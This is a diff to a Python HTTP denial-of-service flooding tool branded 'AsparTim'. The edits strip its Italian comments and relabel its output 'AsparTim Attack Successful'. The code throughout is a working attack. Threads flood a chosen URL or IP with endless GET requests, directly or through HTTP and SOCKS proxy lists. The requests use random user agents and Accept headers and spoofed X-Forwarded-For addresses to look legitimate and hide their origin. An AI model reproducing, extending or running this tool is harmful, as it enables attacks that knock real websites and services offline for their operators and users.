@@ -21,7 +21,7 @@ print (''' \033[91m
            ASPARTIM
 ------------------------------- \033[0m ''')
 print(" ")
-print("\033[94mHTTP Dos Attack\033[0m")
+print("\033[94mHTTP Proxy Dos Attack\033[0m")
 print(" ")
 
 useragents = ["Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1","Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1","Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
@@ -300,72 +300,72 @@ def loop():
 	"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\n",
 	"Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
 	] # header accept a caso per far sembrare le richieste più legittime
-	connection = "Connection: Keep-Alive\r\n" # la keep alive torna sempre utile lol
-	x = 0 # thanks therunixx, my friend
+	connection = "Connection: Keep-Alive\r\n"
+	x = 0
 	go = threading.Event()
-	if choice2 == "y": # se abbiamo scelto la modalita' proxying
-		if choice3 == "0": # e abbiamo scelto gli HTTP proxy
+	if choice2 == "y": 
+		if choice3 == "0":
 			for x in range(threads):
-				RequestProxyHTTP(x+1).start() # starta la classe apposita
-				print ("Thread " + str(x) + " ready!")
-			go.set() # questo fa avviare i threads appena sono tutti pronti
-		else: # se abbiamo scelto i socks
+				RequestProxyHTTP(x+1).start() 
+				print ("Thread " + str(x) + " Ready")
+			go.set() 
+		else: 
 			for x in range(threads):
-				RequestSocksHTTP(x+1).start() # starta la classe apposita
-				print ("Thread " + str(x) + " ready!")
-			go.set() # questo fa avviare i threads appena sono tutti pronti
-	else: # altrimenti manda richieste normali non proxate.
+				RequestSocksHTTP(x+1).start() 
+				print ("Thread " + str(x) + " Ready")
+			go.set()
+	else: 
 		for x in range(threads):
-			RequestDefaultHTTP(x+1).start() # starta la classe apposita
-			print ("Thread " + str(x) + " ready!")
-		go.set() # questo fa avviare i threads appena sono tutti pronti
+			RequestDefaultHTTP(x+1).start() 
+			print ("Thread " + str(x) + " Ready")
+		go.set() 
 
 
-class RequestProxyHTTP(threading.Thread): # la classe del multithreading
+class RequestProxyHTTP(threading.Thread): 
 
-	def __init__(self, counter): # funzione messa su praticamente solo per il counter dei threads. Il parametro counter della funzione, passa l'x+1 di sopra come variabile counter
+	def __init__(self, counter): 
 		threading.Thread.__init__(self)
 		self.counter = counter
 
-	def run(self): # la funzione che da' le istruzioni ai vari threads
-		useragent = "User-Agent: " + random.choice(useragents) + "\r\n" # scelta useragent a caso
-		accept = random.choice(acceptall) # scelta header accept a caso
+	def run(self):
+		useragent = "User-Agent: " + random.choice(useragents) + "\r\n" 
+		accept = random.choice(acceptall) 
 		randomip = str(random.randint(0,255)) + "." + str(random.randint(0,255)) + "." + str(random.randint(0,255)) + "." + str(random.randint(0,255))
-		forward = "X-Forwarded-For: " + randomip + "\r\n" # X-Forwarded-For, un header HTTP che permette di incrementare anonimato (vedi google per info)
+		forward = "X-Forwarded-For: " + randomip + "\r\n" 
 		if choice1 == "1":
 			ip = random.choice(ips)
 			get_host = "GET " + ip + " HTTP/1.1\r\nHost: " + ip + "\r\n"
 		else:
 			get_host = "GET " + url + " HTTP/1.1\r\nHost: " + url2 + "\r\n"
-		request = get_host + useragent + accept + forward + connection + "\r\n" # ecco la final request
-		current = x # per dare l'id al thread
-		if current < len(proxies): # se l'id del thread si puo' associare ad un proxy, usa quel proxy
+		request = get_host + useragent + accept + forward + connection + "\r\n" 
+		current = x 
+		if current < len(proxies): 
 			proxy = proxies[current].strip().split(':')
 		else: # altrimenti lo prende a random
 			proxy = random.choice(proxies).strip().split(":")
 		go.wait() # aspetta che i threads siano pronti
 		while True: # ciclo infinito
 			try:
-				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # ecco il nostro socket
-				s.connect((str(proxy[0]), int(proxy[1]))) # connessione al proxy
-				s.send(str.encode(request)) # encode in bytes della richiesta HTTP
-				print ("AsparTim Attack Successful " + str(proxy[0]+":"+proxy[1]) + " ✓") # print delle richieste
-				try: # invia altre richieste nello stesso thread
-					for y in range(multiple): # fattore di moltiplicazione
-						s.send(str.encode(request)) # encode in bytes della richiesta HTTP
-				except: # se qualcosa va storto, chiude il socket e il ciclo ricomincia
+				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
+				s.connect((str(proxy[0]), int(proxy[1]))) 
+				s.send(str.encode(request))
+				print ("AsparTim Attack Successful " + str(proxy[0]+":"+proxy[1]) + " ✓")
+				try:
+					for y in range(multiple): 
+						s.send(str.encode(request))
+				except:
 					s.close()
 			except:
-				s.close() # se qualcosa va storto, chiude il socket e il ciclo ricomincia
+				s.close()
 
 
-class RequestDefaultHTTP(threading.Thread): # la classe del multithreading
+class RequestDefaultHTTP(threading.Thread):
 
-	def __init__(self, counter): # funzione messa su praticamente solo per il counter dei threads. Il parametro counter della funzione, passa l'x+1 di sopra come variabile counter
+	def __init__(self, counter): 
 		threading.Thread.__init__(self)
 		self.counter = counter
 
-	def run(self): # la funzione che da' le istruzioni ai vari threads
+	def run(self):
 		useragent = "User-Agent: " + random.choice(useragents) + "\r\n" # useragent a caso
 		accept = random.choice(acceptall) # accept a caso
 		if choice1 == "1":
@@ -373,21 +373,21 @@ class RequestDefaultHTTP(threading.Thread): # la classe del multithreading
 			get_host = "GET " + ip + " HTTP/1.1\r\nHost: " + ip + "\r\n"
 		else:
 			get_host = "GET " + url + " HTTP/1.1\r\nHost: " + url2 + "\r\n"
-		request = get_host + useragent + accept + connection + "\r\n" # composizione final request
-		go.wait() # aspetta che i threads siano pronti
+		request = get_host + useragent + accept + connection + "\r\n" 
+		go.wait() 
 		while True:
 			try:
-				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # creazione socket
-				s.connect((str(url2), int(urlport))) # connessione
-				s.send (str.encode(request)) # invio
-				print ("Request sent! @", self.counter) # print req + counter
-				try: # invia altre richieste nello stesso thread
-					for y in range(multiple): # fattore di moltiplicazione
-						s.send(str.encode(request)) # encode in bytes della richiesta HTTP
-				except: # se qualcosa va storto, chiude il socket e il ciclo ricomincia
+				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
+				s.connect((str(url2), int(urlport))) 
+				s.send (str.encode(request))
+				print ("AsparTim Attack Successful")
+				try:
+					for y in range(multiple):
+						s.send(str.encode(request)) 
+				except: 
 					s.close()
-			except: # se qualcosa va storto
-				s.close() # chiude socket e ricomincia
+			except: 
+				s.close()
 
 
 if __name__ == '__main__':
